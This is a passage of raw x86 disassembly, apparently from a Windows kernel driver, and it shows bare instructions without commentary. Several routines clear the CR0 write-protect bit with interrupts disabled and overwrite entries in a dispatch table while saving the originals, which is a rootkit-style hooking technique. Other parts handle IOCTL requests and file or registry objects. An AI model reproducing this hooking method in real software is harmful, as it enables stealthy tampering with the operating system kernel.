   1764b:	cmp    DWORD PTR [eax+ecx*4],0x153fc
   17652:	jne    0x17690
   17654:	mov    ecx,DWORD PTR ds:0x1c058
   1765a:	cmp    DWORD PTR [eax+ecx*4],0x14c50
   17661:	jne    0x17690
   17663:	mov    ecx,DWORD PTR ds:0x1c05c
   17669:	cmp    DWORD PTR [eax+ecx*4],0x14d96
   17670:	jne    0x17690
   17672:	mov    ecx,DWORD PTR ds:0x1c060
   17678:	cmp    DWORD PTR [eax+ecx*4],0x14948
   1767f:	jne    0x17690
   17681:	mov    ecx,DWORD PTR ds:0x1c064
   17687:	cmp    DWORD PTR [eax+ecx*4],edi
   1768a:	je     0x177ad
   17690:	cmp    BYTE PTR [ebp+0x8],bl
   17693:	jne    0x176ac
   17695:	cli    
   17696:	mov    eax,cr0
   17699:	mov    DWORD PTR [ebp-0x4],eax
   1769c:	and    eax,0xfffeffff
   176a1:	mov    cr0,eax
   176a4:	call   0x106e0
   176a9:	mov    BYTE PTR [ebp-0x8],al
   176ac:	xor    edx,edx
   176ae:	cmp    DWORD PTR [ebp+0xc],ebx
   176b1:	jbe    0x17799
   176b7:	mov    ecx,DWORD PTR ds:0x1b17c
   176bd:	mov    ecx,DWORD PTR [ecx]
   176bf:	mov    eax,edx
   176c1:	shl    eax,0x2
   176c4:	add    ecx,eax
   176c6:	cmp    DWORD PTR [ecx],ebx
   176c8:	je     0x1778d
   176ce:	cmp    edx,DWORD PTR ds:0x1c050
   176d4:	jne    0x176ee
   176d6:	mov    ecx,DWORD PTR [ecx]
   176d8:	mov    DWORD PTR ds:0x1c068,ecx
   176de:	mov    ecx,DWORD PTR ds:0x1b17c
   176e4:	mov    ecx,DWORD PTR [ecx]
   176e6:	mov    DWORD PTR [eax+ecx*1],esi
   176e9:	jmp    0x1778d
   176ee:	cmp    edx,DWORD PTR ds:0x1c054
   176f4:	jne    0x1770f
   176f6:	mov    ecx,DWORD PTR [ecx]
   176f8:	mov    DWORD PTR ds:0x1c06c,ecx
   176fe:	mov    ecx,DWORD PTR ds:0x1b17c
   17704:	mov    ecx,DWORD PTR [ecx]
   17706:	mov    DWORD PTR [eax+ecx*1],0x153fc
   1770d:	jmp    0x1778d
   1770f:	cmp    edx,DWORD PTR ds:0x1c058
   17715:	jne    0x17730
   17717:	mov    ecx,DWORD PTR [ecx]
   17719:	mov    DWORD PTR ds:0x1c070,ecx
   1771f:	mov    ecx,DWORD PTR ds:0x1b17c
   17725:	mov    ecx,DWORD PTR [ecx]
   17727:	mov    DWORD PTR [eax+ecx*1],0x14c50
   1772e:	jmp    0x1778d
   17730:	cmp    edx,DWORD PTR ds:0x1c05c
   17736:	jne    0x17751
   17738:	mov    ecx,DWORD PTR [ecx]
   1773a:	mov    DWORD PTR ds:0x1c074,ecx
   17740:	mov    ecx,DWORD PTR ds:0x1b17c
   17746:	mov    ecx,DWORD PTR [ecx]
   17748:	mov    DWORD PTR [eax+ecx*1],0x14d96
   1774f:	jmp    0x1778d
   17751:	cmp    edx,DWORD PTR ds:0x1c060
   17757:	jne    0x17772
   17759:	mov    ecx,DWORD PTR [ecx]
   1775b:	mov    DWORD PTR ds:0x1c078,ecx
   17761:	mov    ecx,DWORD PTR ds:0x1b17c
   17767:	mov    ecx,DWORD PTR [ecx]
   17769:	mov    DWORD PTR [eax+ecx*1],0x14948
   17770:	jmp    0x1778d
   17772:	cmp    edx,DWORD PTR ds:0x1c064
   17778:	jne    0x1778d
   1777a:	mov    ecx,DWORD PTR [ecx]
   1777c:	mov    DWORD PTR ds:0x1c07c,ecx
   17782:	mov    ecx,DWORD PTR ds:0x1b17c
   17788:	mov    ecx,DWORD PTR [ecx]
   1778a:	mov    DWORD PTR [eax+ecx*1],edi
   1778d:	inc    edx
   1778e:	xor    ebx,ebx
   17790:	cmp    edx,DWORD PTR [ebp+0xc]
   17793:	jb     0x176b7
   17799:	cmp    BYTE PTR [ebp+0x8],bl
   1779c:	jne    0x177ad
   1779e:	push   DWORD PTR [ebp-0x8]
   177a1:	call   0x10714
   177a6:	mov    eax,DWORD PTR [ebp-0x4]
   177a9:	mov    cr0,eax
   177ac:	sti    
   177ad:	push   ebx
   177ae:	push   0x1c340
   177b3:	call   DWORD PTR ds:0x1b1b0
   177b9:	pop    edi
   177ba:	pop    esi
   177bb:	pop    ebx
   177bc:	leave  
   177bd:	ret    0x8
   177c0:	int3   
   177c1:	int3   
   177c2:	int3   
   177c3:	int3   
   177c4:	int3   
   177c5:	int3   
   177c6:	mov    edi,edi
   177c8:	push   ebp
   177c9:	mov    ebp,esp
   177cb:	push   ecx
   177cc:	push   ecx
   177cd:	push   ebx
   177ce:	push   esi
   177cf:	mov    esi,DWORD PTR [ebp+0x8]
   177d2:	xor    ebx,ebx
   177d4:	cmp    esi,ebx
   177d6:	mov    DWORD PTR [ebp-0x4],ebx
   177d9:	mov    DWORD PTR [ebp-0x8],0xc000000d
   177e0:	je     0x17887
   177e6:	cmp    BYTE PTR ds:0x1bf92,bl
   177ec:	mov    ecx,DWORD PTR [esi]
   177ee:	jne    0x17807
   177f0:	cmp    BYTE PTR ds:0x1bf91,bl
   177f6:	jne    0x17807
   177f8:	mov    DWORD PTR [esi+0x4],ebx
   177fb:	mov    DWORD PTR [ebp-0x8],0xc0000010
   17802:	jmp    0x17887
   17807:	mov    eax,0x22c018
   1780c:	cmp    ecx,eax
   1780e:	ja     0x17924
   17814:	je     0x17918
   1781a:	sub    ecx,0x22c004
   17820:	je     0x17890
   17822:	push   0x4
   17824:	pop    eax
   17825:	sub    ecx,eax
   17827:	je     0x1785e
   17829:	sub    ecx,eax
   1782b:	je     0x17856
   1782d:	sub    ecx,eax
   1782f:	je     0x1784e
   17831:	sub    ecx,eax
   17833:	jne    0x17943
   17839:	push   ebx
   1783a:	lea    ecx,[esi+0x10]
   1783d:	push   ecx
   1783e:	push   eax
   1783f:	cmp    BYTE PTR [esi+0x218],bl
   17845:	je     0x1787c
   17847:	call   0x11a7a
   1784c:	jmp    0x17881
   1784e:	push   ebx
   1784f:	push   DWORD PTR [esi+0x8]
   17852:	push   0x3
   17854:	jmp    0x1783f
   17856:	push   ebx
   17857:	push   DWORD PTR [esi+0xc]
   1785a:	push   0x2
   1785c:	jmp    0x1783f
   1785e:	cmp    BYTE PTR [esi+0x218],bl
   17864:	je     0x17876
   17866:	push   DWORD PTR [esi+0xc]
   17869:	call   0x1223c
   1786e:	push   ebx
   1786f:	push   DWORD PTR [esi+0xc]
   17872:	push   0x1
   17874:	jmp    0x17847
   17876:	push   ebx
   17877:	push   DWORD PTR [esi+0xc]
   1787a:	push   0x1
   1787c:	call   0x119ac
   17881:	movzx  eax,al
   17884:	mov    DWORD PTR [esi+0x4],eax
   17887:	mov    eax,DWORD PTR [ebp-0x8]
   1788a:	pop    esi
   1788b:	pop    ebx
   1788c:	leave  
   1788d:	ret    0x4
   17890:	mov    DWORD PTR [esi+0x4],0x1
   17897:	cmp    BYTE PTR ds:0x1bf90,bl
   1789d:	jne    0x17887
   1789f:	cli    
   178a0:	mov    eax,cr0
   178a3:	mov    DWORD PTR [ebp-0x4],eax
   178a6:	and    eax,0xfffeffff
   178ab:	mov    cr0,eax
   178ae:	call   0x106e0
   178b3:	mov    BYTE PTR [ebp+0x8],al
   178b6:	mov    eax,ds:0x1bfa0
   178bb:	push   DWORD PTR [eax+0x640]
   178c1:	push   eax
   178c2:	push   ebx
   178c3:	push   0x1
   178c5:	call   0x1743e
   178ca:	mov    DWORD PTR ds:0x1c068,ebx
   178d0:	mov    DWORD PTR ds:0x1c06c,ebx
   178d6:	mov    DWORD PTR ds:0x1c070,ebx
   178dc:	mov    DWORD PTR ds:0x1c074,ebx
   178e2:	mov    DWORD PTR ds:0x1c078,ebx
   178e8:	mov    DWORD PTR ds:0x1c07c,ebx
   178ee:	movzx  eax,BYTE PTR [esi+0x218]
   178f5:	push   eax
   178f6:	push   0x1
   178f8:	call   0x15bc6
   178fd:	push   DWORD PTR [ebp+0x8]
   17900:	call   0x10714
   17905:	mov    eax,DWORD PTR [ebp-0x4]
   17908:	mov    cr0,eax
   1790b:	sti    
   1790c:	mov    BYTE PTR ds:0x1bf90,0x1
   17913:	jmp    0x17887
   17918:	push   ebx
   17919:	lea    eax,[esi+0x10]
   1791c:	push   eax
   1791d:	push   0x5
   1791f:	jmp    0x1783f
   17924:	sub    ecx,0x22c01c
   1792a:	je     0x179be
   17930:	push   0x4
   17932:	pop    eax
   17933:	sub    ecx,eax
   17935:	je     0x179ab
   17937:	sub    ecx,eax
   17939:	je     0x17976
   1793b:	sub    ecx,eax
   1793d:	je     0x17968
   1793f:	sub    ecx,eax
   17941:	je     0x17952
   17943:	mov    DWORD PTR [ebp-0x8],0xc0000010
   1794a:	mov    DWORD PTR [esi+0x4],ebx
   1794d:	jmp    0x17887
   17952:	push   0x1
   17954:	lea    eax,[esi+0x10]
   17957:	push   eax
   17958:	push   DWORD PTR [esi+0xc]
   1795b:	push   DWORD PTR [esi+0x8]
   1795e:	call   0x12050
   17963:	jmp    0x17881
   17968:	add    esi,0x10
   1796b:	push   esi
   1796c:	call   0x169b2
   17971:	jmp    0x17887
   17976:	mov    eax,DWORD PTR [esi+0xc]
   17979:	cmp    eax,ebx
   1797b:	mov    edx,DWORD PTR [esi+0x21c]
   17981:	mov    ecx,DWORD PTR [esi+0x220]
   17987:	je     0x17887
   1798d:	cmp    edx,0xffffffff
   17990:	je     0x17887
   17996:	cmp    ecx,ebx
   17998:	je     0x17887
   1799e:	push   ecx
   1799f:	push   edx
   179a0:	push   eax
   179a1:	call   0x10546
   179a6:	jmp    0x17881
   179ab:	lea    eax,[esi+0x10]
   179ae:	push   eax
   179af:	push   0x1af20
   179b4:	call   0x19fea
   179b9:	jmp    0x17881
   179be:	push   ebx
   179bf:	lea    eax,[esi+0x10]
   179c2:	push   eax
   179c3:	push   0x6
   179c5:	jmp    0x1783f
   179ca:	int3   
   179cb:	int3   
   179cc:	int3   
   179cd:	int3   
   179ce:	int3   
   179cf:	int3   
   179d0:	push   0x184
   179d5:	push   0x1b5f8
   179da:	call   0x1a38c
   179df:	xor    ebx,ebx
   179e1:	mov    WORD PTR [ebp-0x120],bx
   179e8:	push   0x102
   179ed:	push   ebx
   179ee:	lea    eax,[ebp-0x11e]
   179f4:	push   eax
   179f5:	call   0x1a1b0
   179fa:	add    esp,0xc
   179fd:	mov    DWORD PTR [ebp-0x130],ebx
   17a03:	mov    DWORD PTR [ebp-0x124],ebx
   17a09:	mov    DWORD PTR [ebp-0x12c],ebx
   17a0f:	mov    DWORD PTR [ebp-0x134],ebx
   17a15:	mov    DWORD PTR [ebp-0x170],0xfd050f80
   17a1f:	or     DWORD PTR [ebp-0x16c],0xffffffff
   17a26:	xor    eax,eax
   17a28:	lea    edi,[ebp-0x178]
   17a2e:	stos   DWORD PTR es:[edi],eax
   17a2f:	stos   DWORD PTR es:[edi],eax
   17a30:	push   0x1ad46
   17a35:	call   0x10bb8
   17a3a:	mov    ds:0x1bfbc,eax
   17a3f:	mov    esi,0x644
   17a44:	push   esi
   17a45:	push   ebx
   17a46:	call   DWORD PTR ds:0x1b124
   17a4c:	mov    ds:0x1bfa0,eax
   17a51:	cmp    eax,ebx
   17a53:	je     0x17a65
   17a55:	push   esi
   17a56:	push   ebx
   17a57:	push   eax
   17a58:	call   0x1a1b0
   17a5d:	add    esp,0xc
   17a60:	mov    eax,ds:0x1bfa0
   17a65:	mov    DWORD PTR [ebp-0x158],0xc000007b
   17a6f:	mov    DWORD PTR [ebp-0x4],ebx
   17a72:	push   eax
   17a73:	push   DWORD PTR ds:0x1bfbc
   17a79:	push   0x1bfc0
   17a7e:	call   0x1139e
   17a83:	mov    DWORD PTR [ebp-0x158],eax
   17a89:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a90:	jmp    0x17aa2
   17a92:	xor    eax,eax
   17a94:	inc    eax
   17a95:	ret    
   17a96:	mov    esp,DWORD PTR [ebp-0x18]
   17a99:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17aa0:	xor    ebx,ebx
   17aa2:	cmp    DWORD PTR ds:0x1bfbc,ebx
   17aa8:	je     0x17ac9
   17aaa:	cmp    DWORD PTR [ebp-0x158],ebx
   17ab0:	je     0x17ac9
   17ab2:	mov    eax,ds:0x1bfc0
   17ab7:	cmp    eax,ebx
   17ab9:	je     0x17ac9
   17abb:	push   ebx
   17abc:	push   eax
   17abd:	call   DWORD PTR ds:0x1b278
   17ac3:	mov    DWORD PTR ds:0x1bfc0,ebx
   17ac9:	push   0x18
   17acb:	push   ebx
   17acc:	mov    esi,DWORD PTR ds:0x1b124
   17ad2:	call   esi
   17ad4:	mov    DWORD PTR [ebp-0x138],eax
   17ada:	push   0x224
   17adf:	push   ebx
   17ae0:	call   esi
   17ae2:	mov    DWORD PTR [ebp-0x128],eax
   17ae8:	mov    BYTE PTR ds:0x1bf90,0x1
   17aef:	mov    eax,ds:0x1bfa0
   17af4:	push   DWORD PTR [eax+0x640]
   17afa:	push   eax
   17afb:	push   0x1
   17afd:	push   ebx
   17afe:	call   0x1743e
   17b03:	push   ebx
   17b04:	push   ebx
   17b05:	call   0x15bc6
   17b0a:	push   ebx
   17b0b:	mov    esi,0x1ca20
   17b10:	push   esi
   17b11:	push   0x5
   17b13:	call   0x11a7a
   17b18:	push   ebx
   17b19:	push   esi
   17b1a:	push   0x6
   17b1c:	pop    esi
   17b1d:	push   esi
   17b1e:	call   0x11a7a
   17b23:	push   ebx
   17b24:	mov    edi,0x1d0e0
   17b29:	push   edi
   17b2a:	push   0x5
   17b2c:	call   0x11a7a
   17b31:	push   ebx
   17b32:	push   edi
   17b33:	push   esi
   17b34:	call   0x11a7a
   17b39:	push   ebx
   17b3a:	push   0x1d300
   17b3f:	cmp    BYTE PTR ds:0x1bf8c,bl
   17b45:	je     0x17b58
   17b47:	push   0x4
   17b49:	call   0x11a7a
   17b4e:	push   ebx
   17b4f:	push   0x1ce60
   17b54:	push   0x4
   17b56:	jmp    0x17b67
   17b58:	push   0x5
   17b5a:	call   0x11a7a
   17b5f:	push   ebx
   17b60:	push   0x1ce60
   17b65:	push   0x5
   17b67:	call   0x11a7a
   17b6c:	push   ebx
   17b6d:	push   0x1c360
   17b72:	push   0x5
   17b74:	call   0x11a7a
   17b79:	push   ebx
   17b7a:	push   0x1d520
   17b7f:	push   0x5
   17b81:	call   0x11a7a
   17b86:	push   ebx
   17b87:	push   0x1db80
   17b8c:	push   0x5
   17b8e:	call   0x11a7a
   17b93:	push   ebx
   17b94:	mov    edi,0x1c580
   17b99:	push   edi
   17b9a:	push   0x5
   17b9c:	call   0x11a7a
   17ba1:	push   ebx
   17ba2:	push   0x1db80
   17ba7:	push   esi
   17ba8:	call   0x11a7a
   17bad:	push   ebx
   17bae:	push   edi
   17baf:	push   esi
   17bb0:	call   0x11a7a
   17bb5:	push   ebx
   17bb6:	push   0x1d740
   17bbb:	push   esi
   17bbc:	call   0x11a7a
   17bc1:	push   ebx
   17bc2:	push   0x1c120
   17bc7:	push   esi
   17bc8:	call   0x11a7a
   17bcd:	push   ebx
   17bce:	push   0x1c7a0
   17bd3:	push   esi
   17bd4:	call   0x11a7a
   17bd9:	push   ebx
   17bda:	push   0x1cc40
   17bdf:	push   esi
   17be0:	call   0x11a7a
   17be5:	push   ebx
   17be6:	push   0x1c360
   17beb:	push   esi
   17bec:	call   0x11a7a
   17bf1:	push   ebx
   17bf2:	push   0x1d520
   17bf7:	push   esi
   17bf8:	call   0x11a7a
   17bfd:	push   ebx
   17bfe:	push   0x1d300
   17c03:	push   esi
   17c04:	call   0x11a7a
   17c09:	push   ebx
   17c0a:	push   0x1ce60
   17c0f:	push   esi
   17c10:	call   0x11a7a
   17c15:	push   ebx
   17c16:	push   0x1d960
   17c1b:	push   esi
   17c1c:	call   0x11a7a
   17c21:	push   ebx
   17c22:	call   DWORD PTR ds:0x1b208
   17c28:	push   eax
   17c29:	push   0x3
   17c2b:	call   0x11a7a
   17c30:	push   ebx
   17c31:	push   DWORD PTR ds:0x1ce4c
   17c37:	push   DWORD PTR ds:0x1ce48
   17c3d:	push   0x1ddc0
   17c42:	call   DWORD PTR ds:0x1b23c
   17c48:	mov    DWORD PTR [ebp-0x154],0x18
   17c52:	mov    DWORD PTR [ebp-0x150],ebx
   17c58:	mov    DWORD PTR [ebp-0x148],0x200
   17c62:	mov    DWORD PTR [ebp-0x14c],0x1ca00
   17c6c:	mov    DWORD PTR [ebp-0x144],ebx
   17c72:	mov    DWORD PTR [ebp-0x140],ebx
   17c78:	lea    eax,[ebp-0x154]
   17c7e:	push   eax
   17c7f:	push   0x100002
   17c84:	lea    eax,[ebp-0x12c]
   17c8a:	push   eax
   17c8b:	call   DWORD PTR ds:0x1b238
   17c91:	cmp    eax,ebx
   17c93:	jne    0x17fbe
   17c99:	cmp    BYTE PTR ds:0x1bf93,bl
   17c9f:	jne    0x17cd5
   17ca1:	mov    DWORD PTR [ebp-0x4],0x1
   17ca8:	push   0x1af46
   17cad:	call   0x10e38
   17cb2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17cb9:	jmp    0x17cce
   17cbb:	xor    eax,eax
   17cbd:	inc    eax
   17cbe:	ret    
   17cbf:	mov    esp,DWORD PTR [ebp-0x18]
   17cc2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17cc9:	xor    ebx,ebx
   17ccb:	push   0x6
   17ccd:	pop    esi
   17cce:	mov    BYTE PTR ds:0x1bf93,0x1
   17cd5:	mov    edi,DWORD PTR [ebp-0x138]
   17cdb:	cmp    edi,ebx
   17cdd:	je     0x17fb2
   17ce3:	cmp    DWORD PTR [ebp-0x128],ebx
   17ce9:	je     0x17fb2
   17cef:	mov    ecx,esi
   17cf1:	xor    eax,eax
   17cf3:	rep stos DWORD PTR es:[edi],eax
   17cf5:	push   0x224
   17cfa:	push   ebx
   17cfb:	push   DWORD PTR [ebp-0x128]
   17d01:	call   0x1a1b0
   17d06:	add    esp,0xc
   17d09:	mov    edi,0x1cc28
   17d0e:	push   edi
   17d0f:	call   0x1594c
   17d14:	test   al,al
   17d16:	je     0x17fb2
   17d1c:	push   edi
   17d1d:	mov    edi,0x1d728
   17d22:	push   edi
   17d23:	call   DWORD PTR ds:0x1b160
   17d29:	push   0x1abce
   17d2e:	push   edi
   17d2f:	call   DWORD PTR ds:0x1b280
   17d35:	push   0x1c790
   17d3a:	push   edi
   17d3b:	call   DWORD PTR ds:0x1b20c
   17d41:	push   0x1af34
   17d46:	push   edi
   17d47:	call   DWORD PTR ds:0x1b280
   17d4d:	mov    DWORD PTR [ebp-0x154],0x18
   17d57:	mov    DWORD PTR [ebp-0x150],ebx
   17d5d:	mov    DWORD PTR [ebp-0x148],0x240
   17d67:	mov    DWORD PTR [ebp-0x14c],edi
   17d6d:	mov    DWORD PTR [ebp-0x144],ebx
   17d73:	mov    DWORD PTR [ebp-0x140],ebx
   17d79:	push   ebx
   17d7a:	push   ebx
   17d7b:	push   0x1060
   17d80:	push   0x1
   17d82:	push   0x7
   17d84:	push   ebx
   17d85:	push   ebx
   17d86:	lea    eax,[ebp-0x160]
   17d8c:	push   eax
   17d8d:	lea    eax,[ebp-0x154]
   17d93:	push   eax
   17d94:	push   0x1f01ff
   17d99:	lea    eax,[ebp-0x124]
   17d9f:	push   eax
   17da0:	call   DWORD PTR ds:0x1b1e0
   17da6:	cmp    eax,ebx
   17da8:	jne    0x17fb2
   17dae:	xor    eax,eax
   17db0:	lea    edi,[ebp-0x168]
   17db6:	stos   DWORD PTR es:[edi],eax
   17db7:	stos   DWORD PTR es:[edi],eax
   17db8:	push   0xe
   17dba:	push   0x8
   17dbc:	lea    eax,[ebp-0x168]
   17dc2:	push   eax
   17dc3:	lea    eax,[ebp-0x160]
   17dc9:	push   eax
   17dca:	push   DWORD PTR [ebp-0x124]
   17dd0:	call   DWORD PTR ds:0x1b234
   17dd6:	cmp    eax,ebx
   17dd8:	jne    0x17fa6
   17dde:	push   0x5
   17de0:	push   0x18
   17de2:	lea    eax,[ebp-0x194]
   17de8:	push   eax
   17de9:	lea    eax,[ebp-0x160]
   17def:	push   eax
   17df0:	push   DWORD PTR [ebp-0x124]
   17df6:	call   DWORD PTR ds:0x1b188
   17dfc:	cmp    eax,ebx
   17dfe:	jne    0x17fa6
   17e04:	cmp    DWORD PTR [ebp-0x18c],ebx
   17e0a:	je     0x17fa6
   17e10:	cmp    DWORD PTR [ebp-0x18c],0xffffffff
   17e17:	je     0x17fa6
   17e1d:	mov    edi,0x104
   17e22:	push   edi
   17e23:	push   ebx
   17e24:	lea    eax,[ebp-0x120]
   17e2a:	push   eax
   17e2b:	call   0x1a1b0
   17e30:	add    esp,0xc
   17e33:	mov    eax,DWORD PTR [ebp-0x18c]
   17e39:	cmp    eax,edi
   17e3b:	jb     0x17e40
   17e3d:	lea    eax,[edi-0x1]
   17e40:	push   ebx
   17e41:	push   ebx
   17e42:	push   eax
   17e43:	lea    eax,[ebp-0x120]
   17e49:	push   eax
   17e4a:	lea    eax,[ebp-0x160]
   17e50:	push   eax
   17e51:	push   ebx
   17e52:	push   ebx
   17e53:	push   ebx
   17e54:	push   DWORD PTR [ebp-0x124]
   17e5a:	call   DWORD PTR ds:0x1b184
   17e60:	cmp    eax,ebx
   17e62:	jne    0x17fa6
   17e68:	lea    eax,[ebp-0x120]
   17e6e:	push   eax
   17e6f:	call   DWORD PTR ds:0x1b230
   17e75:	pop    ecx
   17e76:	lea    ecx,[ebp-0x130]
   17e7c:	push   ecx
   17e7d:	push   eax
   17e7e:	call   DWORD PTR ds:0x1b27c
   17e84:	cmp    eax,ebx
   17e86:	jne    0x17fa6
   17e8c:	push   DWORD PTR [ebp-0x138]
   17e92:	push   DWORD PTR [ebp-0x130]
   17e98:	call   DWORD PTR ds:0x1b214
   17e9e:	mov    DWORD PTR [ebp-0x4],0x2
   17ea5:	push   0x224
   17eaa:	lea    eax,[ebp-0x17c]
   17eb0:	push   eax
   17eb1:	push   DWORD PTR [ebp-0x128]
   17eb7:	call   0x1345e
   17ebc:	mov    DWORD PTR [ebp-0x13c],eax
   17ec2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17ec9:	jmp    0x17ee4
   17ecb:	xor    eax,eax
   17ecd:	inc    eax
   17ece:	ret    
   17ecf:	mov    esp,DWORD PTR [ebp-0x18]
   17ed2:	xor    ebx,ebx
   17ed4:	mov    DWORD PTR [ebp-0x13c],ebx
   17eda:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17ee1:	push   0x6
   17ee3:	pop    esi
   17ee4:	push   DWORD PTR [ebp-0x138]
   17eea:	call   DWORD PTR ds:0x1b210
   17ef0:	mov    ecx,DWORD PTR [ebp-0x130]
   17ef6:	call   DWORD PTR ds:0x1b284
   17efc:	cmp    DWORD PTR [ebp-0x13c],ebx
   17f02:	je     0x17fa6
   17f08:	xor    eax,eax
   17f0a:	lea    edi,[ebp-0x168]
   17f10:	stos   DWORD PTR es:[edi],eax
   17f11:	stos   DWORD PTR es:[edi],eax
   17f12:	push   0xe
   17f14:	push   0x8
   17f16:	lea    eax,[ebp-0x168]
   17f1c:	push   eax
   17f1d:	lea    eax,[ebp-0x160]
   17f23:	push   eax
   17f24:	push   DWORD PTR [ebp-0x124]
   17f2a:	call   DWORD PTR ds:0x1b234
   17f30:	cmp    eax,ebx
   17f32:	jne    0x17fa6
   17f34:	push   DWORD PTR [ebp-0x13c]
   17f3a:	push   0x1af30
   17f3f:	lea    eax,[ebp-0x120]
   17f45:	push   eax
   17f46:	call   DWORD PTR ds:0x1b220
   17f4c:	add    esp,0xc
   17f4f:	lea    eax,[ebp-0x120]
   17f55:	lea    edi,[eax+0x1]
   17f58:	mov    cl,BYTE PTR [eax]
   17f5a:	inc    eax
   17f5b:	cmp    cl,bl
   17f5d:	jne    0x17f58
   17f5f:	sub    eax,edi
   17f61:	push   ebx
   17f62:	push   ebx
   17f63:	push   eax
   17f64:	lea    eax,[ebp-0x120]
   17f6a:	push   eax
   17f6b:	lea    eax,[ebp-0x160]
   17f71:	push   eax
   17f72:	push   ebx
   17f73:	push   ebx
   17f74:	push   ebx
   17f75:	push   DWORD PTR [ebp-0x124]
   17f7b:	call   DWORD PTR ds:0x1b1dc
   17f81:	cmp    eax,ebx
   17f83:	jne    0x17fa6
   17f85:	push   ebx
   17f86:	push   DWORD PTR [ebp-0x12c]
   17f8c:	call   DWORD PTR ds:0x1b22c
   17f92:	lea    eax,[ebp-0x170]
   17f98:	push   eax
   17f99:	push   ebx
   17f9a:	push   DWORD PTR [ebp-0x12c]
   17fa0:	call   DWORD PTR ds:0x1b228
   17fa6:	push   DWORD PTR [ebp-0x124]
   17fac:	call   DWORD PTR ds:0x1b180
   17fb2:	push   DWORD PTR [ebp-0x12c]
   17fb8:	call   DWORD PTR ds:0x1b180
   17fbe:	mov    DWORD PTR [ebp-0x154],0x18
   17fc8:	mov    DWORD PTR [ebp-0x150],ebx
   17fce:	mov    DWORD PTR [ebp-0x148],0x200
   17fd8:	mov    DWORD PTR [ebp-0x14c],0x1c0b0
   17fe2:	mov    DWORD PTR [ebp-0x144],ebx
   17fe8:	mov    DWORD PTR [ebp-0x140],ebx
   17fee:	lea    eax,[ebp-0x154]
   17ff4:	push   eax
   17ff5:	push   0x100002
   17ffa:	lea    eax,[ebp-0x134]
   18000:	push   eax
   18001:	call   DWORD PTR ds:0x1b238
   18007:	cmp    eax,ebx
   18009:	jne    0x18053
   1800b:	push   DWORD PTR [ebp-0x128]
   18011:	call   DWORD PTR ds:0x1b130
   18017:	test   al,al
   18019:	je     0x1803a
   1801b:	push   DWORD PTR [ebp-0x128]
   18021:	call   0x177c6
   18026:	push   0x224
   1802b:	push   ebx
   1802c:	push   DWORD PTR [ebp-0x128]
   18032:	call   0x1a1b0
   18037:	add    esp,0xc
   1803a:	push   ebx
   1803b:	push   DWORD PTR [ebp-0x134]
   18041:	call   DWORD PTR ds:0x1b22c
   18047:	push   DWORD PTR [ebp-0x134]
   1804d:	call   DWORD PTR ds:0x1b180
   18053:	push   ebx
   18054:	push   DWORD PTR ds:0x1c0ac
   1805a:	push   DWORD PTR ds:0x1c0a8
   18060:	mov    edi,0x1c0c0
   18065:	push   edi
   18066:	call   DWORD PTR ds:0x1b23c
   1806c:	push   0x1c0a8
   18071:	push   ebx
   18072:	push   ebx
   18073:	push   ebx
   18074:	push   edi
   18075:	mov    edi,DWORD PTR ds:0x1b110
   1807b:	call   edi
   1807d:	lea    eax,[ebp-0x178]
   18083:	push   eax
   18084:	push   ebx
   18085:	push   ebx
   18086:	push   ebx
   18087:	push   0x1ddc0
   1808c:	call   edi
   1808e:	cmp    eax,ebx
   18090:	jne    0x17c48
   18096:	mov    eax,ds:0x1bfa0
   1809b:	cmp    eax,ebx
   1809d:	je     0x180b8
   1809f:	mov    ecx,DWORD PTR [eax+0x640]
   180a5:	cmp    ecx,ebx
   180a7:	je     0x180b8
   180a9:	push   ecx
   180aa:	push   eax
   180ab:	push   0x1
   180ad:	push   ebx
   180ae:	call   0x1743e
   180b3:	mov    eax,ds:0x1bfa0
   180b8:	cmp    BYTE PTR ds:0x1bf90,bl
   180be:	je     0x180cc
   180c0:	push   ebx
   180c1:	push   ebx
   180c2:	call   0x15bc6
   180c7:	jmp    0x17c30
   180cc:	push   DWORD PTR [eax+0x640]
   180d2:	push   ebx
   180d3:	call   0x175ee
   180d8:	jmp    0x17c30
   180dd:	int3   
   180de:	int3   
   180df:	int3   
   180e0:	int3   
   180e1:	int3   
   180e2:	mov    edi,edi
   180e4:	push   ebp
   180e5:	mov    ebp,esp
   180e7:	sub    esp,0x654
   180ed:	mov    eax,ds:0x1bb6c
   180f2:	xor    eax,ebp
   180f4:	mov    DWORD PTR [ebp-0x4],eax
   180f7:	push   ebx
   180f8:	push   esi
   180f9:	mov    esi,DWORD PTR ds:0x1b250
   180ff:	xor    ebx,ebx
   18101:	push   0x1ddc0
   18106:	mov    DWORD PTR [ebp-0x620],ebx
   1810c:	call   esi
   1810e:	push   0x1d0a0
   18113:	call   esi
   18115:	push   0x1c0c0
   1811a:	call   esi
   1811c:	or     eax,0xffffffff
   1811f:	mov    DWORD PTR ds:0x1ce48,0xfe363c80
   18129:	mov    ds:0x1ce4c,eax
   1812e:	mov    DWORD PTR [ebp-0x640],0xfffec780
   18138:	mov    DWORD PTR [ebp-0x63c],eax
   1813e:	mov    DWORD PTR ds:0x1c0a8,0xfff0bdc0
   18148:	mov    ds:0x1c0ac,eax
   1814d:	mov    DWORD PTR ds:0x1dd88,0x4d2fa200
   18157:	mov    ds:0x1dd8c,eax
   1815c:	call   0x1385a
   18161:	call   0x1396e
   18166:	cmp    eax,ebx
   18168:	jne    0x18d21
   1816e:	mov    esi,DWORD PTR ds:0x1b164
   18174:	push   edi
   18175:	push   0x1a5da
   1817a:	lea    eax,[ebp-0x654]
   18180:	push   eax
   18181:	call   esi
   18183:	mov    edi,DWORD PTR ds:0x1b18c
   18189:	jmp    0x181ae
   1818b:	lea    eax,[ebp-0x640]
   18191:	push   eax
   18192:	push   ebx
   18193:	push   ebx
   18194:	push   ebx
   18195:	push   0x1d0a0
   1819a:	call   DWORD PTR ds:0x1b110
   181a0:	push   0x1a5da
   181a5:	lea    eax,[ebp-0x654]
   181ab:	push   eax
   181ac:	call   esi
   181ae:	push   0x21
   181b0:	lea    eax,[ebp-0x654]
   181b6:	mov    DWORD PTR [ebp-0x630],eax
   181bc:	push   0x7
   181be:	lea    eax,[ebp-0x64c]
   181c4:	push   eax
   181c5:	lea    eax,[ebp-0x638]
   181cb:	push   eax
   181cc:	push   0x100080
   181d1:	lea    eax,[ebp-0x620]
   181d7:	push   eax
